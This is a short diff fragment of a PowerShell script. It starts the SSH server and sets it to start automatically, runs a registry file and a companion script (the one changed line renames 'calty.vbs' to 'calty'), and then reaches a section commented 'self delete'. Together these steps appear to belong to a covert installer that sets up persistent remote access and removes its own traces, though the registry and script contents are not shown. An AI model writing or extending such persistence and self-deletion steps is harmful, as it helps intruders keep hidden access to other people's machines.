@@ -54,7 +54,7 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 
 #install the registry
-./wrev.reg; ./calty.vbs
+./wrev.reg; ./calty
 
 # self delete
 cd $initial_dir
